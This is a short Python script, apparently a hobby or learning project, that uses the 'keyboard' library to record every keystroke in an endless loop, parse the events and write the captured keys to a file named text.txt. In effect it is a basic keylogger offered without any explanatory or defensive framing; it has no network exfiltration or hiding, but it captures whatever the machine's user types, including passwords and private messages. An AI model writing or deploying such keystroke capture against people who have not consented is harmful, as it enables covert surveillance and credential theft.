import keyboard
file = open("text.txt","w")
file.close()
listtext = []
while True :
    record = keyboard.record(until="space")
    for i in record:
        i = str(i)
        if len(i) > 21 :
            listtext.append(i.split("KeyboardEvent")[1])
            print(i.split("KeyboardEvent")[1], end="\n")
        elif len(i) <= 21 :
            if i[16] == "u" :
                listtext.append(i[14])
                print(i[14], end="") 
                
    textfile = open("text.txt", "w")
    for element in listtext:
        textfile.write(element + "\n")
